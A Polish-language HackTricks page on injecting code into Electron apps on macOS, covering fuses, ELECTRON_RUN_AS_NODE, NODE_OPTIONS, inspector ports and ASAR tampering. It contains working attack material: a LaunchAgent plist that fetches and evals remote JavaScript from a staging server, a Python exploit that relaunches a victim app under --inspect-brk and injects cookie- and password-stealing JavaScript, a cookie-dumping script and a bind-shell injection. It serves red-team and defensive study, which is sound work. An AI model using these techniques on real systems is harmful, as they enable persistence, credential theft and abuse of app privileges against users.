# Wstrzykiwanie kodu do aplikacji Electron w macOS

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli nie wiesz, czym jest Electron, [**tutaj znajdziesz wiele informacji**](https://book.hacktricks.wiki/en/desktop-application-security/electron-desktop-apps/index.html#rce-xss--contextisolation). Na razie wystarczy wiedzieć, że Electron uruchamia **node**.\
Node ma też pewne **parametry** i **zmienne środowiskowe**, których można użyć, aby **spowodować wykonanie innego kodu** poza wskazanym plikiem.

Informacje o wymaganiu lokalnego zapisu działającym na wielu platformach oraz ścieżkach ASAR/V8 snapshot znajdziesz w artykule [Electron local code injection and snapshot tampering](../../../desktop-application-security/electron-desktop-apps/electron-local-code-injection-and-snapshot-tampering.md).

### Electron Fuses

Te techniki zostaną omówione dalej, ale ostatnio Electron dodał kilka **flag bezpieczeństwa, które mają im zapobiegać**. Są to [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), a poniższe z nich służą do **blokowania** aplikacjom Electron w macOS **ładowania dowolnego kodu**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Jeśli ta funkcja jest wyłączona, uniemożliwia użycie zmiennej środowiskowej **`ELECTRON_RUN_AS_NODE`** do wstrzykiwania kodu.
- **`EnableNodeCliInspectArguments`**: Jeśli ta funkcja jest wyłączona, parametry takie jak `--inspect` i `--inspect-brk` nie będą uwzględniane. Zapobiega to wstrzykiwaniu kodu tą metodą.
- **`EnableEmbeddedAsarIntegrityValidation`**: Jeśli ta funkcja jest włączona, załadowany **plik** **`asar`** zostanie **zweryfikowany** przez macOS. **Zapobiega** to **wstrzyknięciu kodu** przez modyfikację zawartości tego pliku.
- **`OnlyLoadAppFromAsar`**: Jeśli ta funkcja jest włączona, aplikacja nie będzie wyszukiwać plików do załadowania w następującej kolejności: **`app.asar`**, **`app`**, a na końcu **`default_app.asar`**. Sprawdzi i użyje wyłącznie pliku app.asar, co w połączeniu z fuse **`embeddedAsarIntegrityValidation`** sprawia, że **załadowanie niezweryfikowanego kodu** jest **niemożliwe**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Jeśli ta funkcja jest włączona, proces przeglądarki używa pliku `browser_v8_context_snapshot.bin` jako V8 snapshot.

Innym interesującym fuse, który nie zapobiega wstrzykiwaniu kodu, jest:

- **EnableCookieEncryption**: Jeśli ta funkcja jest włączona, magazyn plików cookie na dysku jest szyfrowany za pomocą kluczy kryptograficznych na poziomie systemu operacyjnego.

### Sprawdzanie Electron Fuses

Te **flagi** aplikacji można **sprawdzić** za pomocą:

```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
  RunAsNode is Disabled
  EnableCookieEncryption is Enabled
  EnableNodeOptionsEnvironmentVariable is Disabled
  EnableNodeCliInspectArguments is Disabled
  EnableEmbeddedAsarIntegrityValidation is Enabled
  OnlyLoadAppFromAsar is Enabled
  LoadBrowserProcessSpecificV8Snapshot is Disabled
```

### Modyfikowanie Electron Fuses

Jak [**wspomniano w dokumentacji**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), konfiguracja **Electron Fuses** jest zapisana wewnątrz **binarium Electron**, które zawiera gdzieś ciąg **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

W aplikacjach macOS jest to zazwyczaj `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`

```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```

Możesz załadować ten plik w [https://hexed.it/](https://hexed.it/) i wyszukać poprzedni ciąg. Po nim zobaczysz w ASCII cyfrę „0” lub „1”, wskazującą, czy każdy fuse jest wyłączony, czy włączony. Wystarczy zmodyfikować kod hex (`0x30` to `0`, a `0x31` to `1`), aby **zmienić wartości fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Pamiętaj, że jeśli spróbujesz **nadpisać** plik binarny **`Electron Framework`** wewnątrz aplikacji zmodyfikowanymi bajtami, aplikacja nie uruchomi się.

## RCE przez dodanie kodu do aplikacji Electron

Aplikacja Electron może korzystać z **zewnętrznych plików JS/HTML**, więc atakujący może wstrzyknąć kod do tych plików, których podpis nie zostanie sprawdzony, i wykonać dowolny kod w kontekście aplikacji.

> [!CAUTION]
> Obecnie istnieją jednak 2 ograniczenia:
>
> - Uprawnienie **`kTCCServiceSystemPolicyAppBundles`** jest **wymagane**, aby zmodyfikować aplikację, więc domyślnie nie jest to już możliwe.
> - Skompilowany plik **`asap`** ma zazwyczaj włączone fuse **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`**
>
> To sprawia, że ta ścieżka ataku jest bardziej skomplikowana (lub niemożliwa).

Pamiętaj, że wymaganie uprawnienia **`kTCCServiceSystemPolicyAppBundles`** można obejść, kopiując aplikację do innego katalogu (np. **`/tmp`**), zmieniając nazwę folderu **`app.app/Contents`** na **`app.app/NotCon`**, **modyfikując** plik **asar** za pomocą swojego **złośliwego** kodu, przywracając nazwę **`app.app/Contents`**, a następnie uruchamiając aplikację.<sup>[[5]](#references)</sup>

Kod z pliku asar można rozpakować za pomocą:

```bash
npx asar extract app.asar app-decomp
```

Następnie spakuj go ponownie po zmodyfikowaniu za pomocą:

```bash
npx asar pack app-decomp app-new.asar
```

## RCE with ELECTRON_RUN_AS_NODE

Zgodnie z [**dokumentacją**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), jeśli ta zmienna środowiskowa jest ustawiona, proces zostanie uruchomiony jako zwykły proces Node.js.<sup>[[6]](#references)</sup>

```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

> [!CAUTION]
> Jeśli fuse **`RunAsNode`** jest wyłączony, zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`** zostanie zignorowana i to nie zadziała.

### Injection z App Plist

Jak [**zaproponowano tutaj**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać persistence:<sup>[[2]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
    </dict>
    <key>Label</key>
    <string>com.xpnsec.hideme</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

## RCE with `NODE_OPTIONS`

Możesz zapisać payload w innym pliku i go wykonać:

```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```

> [!CAUTION]
> Jeśli fuse **`EnableNodeOptionsEnvironmentVariable`** jest **wyłączony**, aplikacja **zignoruje** zmienną środowiskową **NODE_OPTIONS** po uruchomieniu, chyba że ustawiono zmienną środowiskową **`ELECTRON_RUN_AS_NODE`**. Ona również zostanie **zignorowana**, jeśli fuse **`RunAsNode`** jest wyłączony.
>
> Jeśli nie ustawisz **`ELECTRON_RUN_AS_NODE`**, zobaczysz **błąd**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Wstrzykiwanie z App Plist

Możesz nadużyć tej zmiennej środowiskowej w pliku plist, aby utrzymać persistence, dodając następujące klucze:

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
           <key>ELECTRON_RUN_AS_NODE</key>
           <string>true</string>
           <key>NODE_OPTIONS</key>
           <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## RCE przez inspekcję

Według [**tego**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), jeśli uruchomisz aplikację Electron z flagami takimi jak **`--inspect`**, **`--inspect-brk`** i **`--remote-debugging-port`**, zostanie otwarty **port debugowania**, z którym możesz się połączyć (na przykład z Chrome, używając `chrome://inspect`), a następnie **wstrzyknąć do niego kod** lub nawet uruchomić nowe procesy.<sup>[[7]](#references)</sup>\
Na przykład:

```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```

W [**tym wpisie na blogu**](https://hackerone.com/reports/1274695) wykorzystano tę funkcję debugowania, aby zmusić headless Chrome do **pobierania dowolnych plików do dowolnych lokalizacji**.<sup>[[8]](#references)</sup>

> [!TIP]
> Jeśli aplikacja ma własny sposób sprawdzania, czy ustawiono zmienne środowiskowe lub parametry, takie jak `--inspect`, możesz spróbować **obejść** to podczas działania, używając argumentu `--inspect-brk`, który **zatrzyma wykonywanie** na początku działania aplikacji i umożliwi wykonanie obejścia (na przykład nadpisanie argumentów lub zmiennych środowiskowych bieżącego procesu).

Poniższy exploit polegał na tym, że monitorowanie aplikacji i uruchomienie jej z parametrem `--inspect-brk` pozwalało obejść zastosowaną przez nią niestandardową ochronę (przez nadpisanie parametrów procesu w celu usunięcia `--inspect-brk`), a następnie wstrzyknąć payload JS, który wykradał cookies i dane uwierzytelniające z aplikacji:

```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
    const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

    fs.writeFile(filePath, data, (err) => {
        if (err) {
            console.error(`Error writing to file ${filePath}:`, err);
        } else {
            console.log(`File written successfully at ${filePath}`);
        }
    });
}

function get_cookies() {
    intervalIdCookies = setInterval(() => {
        console.log("Checking cookies...");
        wc.session.cookies.get({})
        .then((cookies) => {
            tokenCookie = cookies.find(cookie => cookie.name === "token");
            if (tokenCookie){
                writeToFile("/tmp/cookies.txt", cookies);
                clearInterval(intervalIdCookies);
                wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
            }
        })
    }, 1000);
}

function get_creds() {
    in_location = false;
    intervalIdCreds = setInterval(() => {
        if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
            in_location = true;
            console.log("Injecting creds logger...");
            wc.executeJavaScript(`
                (function() {
                    email = document.getElementById('login_email_id');
                    password = document.getElementById('login_password_id');
                    if (password && email) {
                        return email.value+":"+password.value;
                    }
                })();
            `).then(result => {
                writeToFile("/tmp/victim_credentials.txt", result);
            })
        }
        else if (in_location) {
            wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
            clearInterval(intervalIdCreds);
        }
    }, 10); // Check every 10ms
    setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
    """
    Fetch the local inspector's WebSocket URL from the JSON endpoint.
    Assumes there's exactly one debug target. 
    """
    global INSPECT_URL

    url = "http://127.0.0.1:9229/json"
    response = requests.get(url)
    data = response.json()
    if not data:
        raise RuntimeError("No debug targets found on port 9229.")
    # data[0] should contain an object with "webSocketDebuggerUrl"
    ws_url = data[0].get("webSocketDebuggerUrl")
    if not ws_url:
        raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
    INSPECT_URL = ws_url


async def monitor_victim():
    print("Monitoring victim process...")
    found = False
    while not found:
        sleep(1)  # Check every second
        for process in psutil.process_iter(attrs=['pid', 'name']):
            try:
                # Check if the process name contains "victim"
                if process.info['name'] and 'victim' in process.info['name']:
                    found = True
                    print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
                    os.kill(process.info['pid'], 9)  # Force kill the process
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                # Handle processes that might have terminated or are inaccessible
                pass
    os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
    global CONTEXT_ID, NAME, UNIQUE_ID
    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        
        sleep(1)

        await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

        await send_cmd(ws, "Profiler.enable")

        await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

        await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

        await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

        code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
        print("Injected code to bypass protections")


async def js_payloads():
    global CONT, CONTEXT_ID, NAME, UNIQUE_ID

    print(f"Connecting to {INSPECT_URL} ...")

    async with websockets.connect(INSPECT_URL) as ws:
        data = await send_cmd(ws, "Runtime.enable", get_first=True)
        CONTEXT_ID = data["params"]["context"]["id"]
        NAME = data["params"]["context"]["name"]
        UNIQUE_ID = data["params"]["context"]["uniqueId"]
        await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
        await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
    await monitor_victim()
    sleep(3)
    await get_debugger_url()
    await bypass_protections()

    sleep(7)

    await js_payloads()
    


async def send_cmd(ws, method, get_first=False, params={}):
    """
    Send a command to the inspector and read until we get a response with matching "id".
    """
    global CONT

    CONT += 1

    # Send the command
    await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
    sleep(0.4)

    # Read messages until we get our command result
    while True:
        response = await ws.recv()
        data = json.loads(response)

        # Print for debugging
        print(f"[{method} / {CONT}] ->", data)

        if get_first:
            return data

        # If this message is a response to our command (by matching "id"), break
        if data.get("id") == CONT:
            return data

        # Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
    asyncio.run(main())
```

> [!CAUTION]
> Jeśli fuse **`EnableNodeCliInspectArguments`** jest wyłączony, aplikacja będzie **ignorować parametry node** (takie jak `--inspect`) podczas uruchamiania, chyba że ustawiona jest zmienna środowiskowa **`ELECTRON_RUN_AS_NODE`**. Ona również będzie **ignorowana**, jeśli fuse **`RunAsNode`** jest wyłączony.
>
> Można jednak nadal użyć **parametru Electron `--remote-debugging-port=9229`**, ale poprzedni payload nie zadziała do uruchamiania innych procesów.

Używając parametru **`--remote-debugging-port=9222`**, można wykraść pewne informacje z aplikacji Electron, takie jak **historia** (za pomocą poleceń GET) lub **cookies** przeglądarki (są one **odszyfrowywane** w przeglądarce, a dostępny jest **endpoint JSON**, który je zwraca).

Możesz dowiedzieć się, jak to zrobić, [**tutaj**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) i [**tutaj**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), a także użyć automatycznego narzędzia [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) lub prostego skryptu:<sup>[[9]](#references)[[10]](#references)</sup>

```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```



### Wstrzykiwanie za pomocą pliku Plist aplikacji

Możesz wykorzystać tę zmienną środowiskową w pliku plist, aby utrzymać trwałość, dodając te klucze:

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.hacktricks.hideme</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

## TCC Bypass z wykorzystaniem starszych wersji

> [!TIP]
> Demon TCC w macOS nie sprawdza uruchamianej wersji aplikacji. Jeśli więc **nie możesz wstrzyknąć kodu do aplikacji Electron** żadną z poprzednich technik, możesz pobrać starszą wersję APP i wstrzyknąć do niej kod, ponieważ nadal będzie mieć uprawnienia TCC (chyba że uniemożliwi to Trust Cache).

## Uruchamianie kodu innego niż JS

Poprzednie techniki pozwalają uruchamiać **kod JS wewnątrz procesu aplikacji Electron**. Pamiętaj jednak, że **procesy potomne działają w tym samym profilu sandboxa** co aplikacja nadrzędna i **dziedziczą jej uprawnienia TCC**.\
Dlatego jeśli chcesz na przykład nadużyć uprawnień, by uzyskać dostęp do kamery lub mikrofonu, możesz po prostu **uruchomić inny plik binarny z poziomu procesu**.

## Istotne podatności Electron na macOS (2023–2024)

### CVE-2023-44402 – obejście integralności ASAR

Electron ≤22.3.23 oraz różne wersje przedpremierowe 23–27 pozwalały atakującemu z prawem zapisu do folderu `.app/Contents/Resources` obejść fuse `embeddedAsarIntegrityValidation` **oraz** `onlyLoadAppFromAsar`. Błąd wynikał z *pomylenia typu pliku* w mechanizmie sprawdzania integralności, który pozwalał załadować spreparowany **katalog o nazwie `app.asar`** zamiast zweryfikowanego archiwum. W rezultacie kod JavaScript umieszczony w tym katalogu był wykonywany przy uruchomieniu aplikacji. Nawet dostawcy, którzy zastosowali się do zaleceń dotyczących hardeningu i włączyli oba fuse, nadal byli więc podatni na macOS.<sup>[[3]](#references)</sup>

Poprawione wersje Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** i **27.0.0-alpha.7**. Atakujący, którzy znajdą aplikację działającą na starszej wersji, mogą zastąpić `Contents/Resources/app.asar` własnym katalogiem, aby uruchomić kod z uprawnieniami TCC aplikacji.<sup>[[3]](#references)</sup> 

### Klaster CVE z 2024 r. dotyczący „RunAsNode” / „enableNodeCliInspectArguments”

W styczniu 2024 r. seria CVE (od CVE-2024-23738 do CVE-2024-23743) zwróciła uwagę na to, że wiele aplikacji Electron jest dostarczanych z wciąż włączonymi fuse **RunAsNode** i **EnableNodeCliInspectArguments**. Lokalny atakujący może więc ponownie uruchomić program ze zmienną środowiskową `ELECTRON_RUN_AS_NODE=1` lub flagami takimi jak `--inspect-brk`, przekształcając go w *ogólny* proces Node.js, który dziedziczy wszystkie uprawnienia sandboxa i TCC aplikacji.<sup>[[4]](#references)</sup>

Chociaż zespół Electron zakwestionował ocenę „critical” i zauważył, że atakujący i tak musi mieć możliwość lokalnego wykonania kodu, problem nadal jest przydatny podczas post-exploitation, ponieważ zmienia dowolny podatny pakiet Electron w binarny plik *living-off-the-land*, który może np. odczytywać Kontakty, Zdjęcia lub inne wrażliwe zasoby, do których aplikacja desktopowa wcześniej uzyskała dostęp.<sup>[[4]](#references)</sup>

Zalecenia obronne od opiekunów Electron:<sup>[[4]](#references)</sup>

* Wyłącz fuse `RunAsNode` i `EnableNodeCliInspectArguments` w kompilacjach produkcyjnych.
* Jeśli aplikacja rzeczywiście potrzebuje pomocniczego procesu Node.js, użyj nowszego API **UtilityProcess** zamiast ponownie włączać te fuse. 

## Automatyczne Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Narzędzie [**electroniz3r**](https://github.com/r3ggi/electroniz3r) można łatwo wykorzystać do **wyszukiwania podatnych aplikacji Electron** zainstalowanych w systemie i wstrzykiwania do nich kodu. Narzędzie próbuje użyć techniki **`--inspect`**:<sup>[[5]](#references)</sup>

Trzeba je samodzielnie skompilować. Można go użyć w następujący sposób:

```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```

- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki został zaprojektowany do instalowania backdoora w aplikacjach Electron poprzez zastępowanie plików JavaScript aplikacji plikami JavaScript Loki Command & Control.

## References

- [1] [Bezpieczniki Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection za pośrednictwem frameworków innych firm - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Obejście weryfikacji integralności ASAR przez pomylenie typu pliku (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Oświadczenie dotyczące CVE związanych z 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing prywatności macOS - Nowa broń w arsenale Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Zmienne środowiskowe | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Dlaczego aplikacje Electron nie mogą poufnie przechowywać Twoich sekretów: opcja --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Zgłoszenie HackerOne #1274695 - Nadużycie debugowania Electron do pobierania dowolnych plików](https://hackerone.com/reports/1274695)
- [9] [Ręce w słoiku z cookies: Dumping cookies za pomocą portu zdalnego debuggera Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugowanie błędów Dumping cookies za pomocą zdalnego debuggera Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
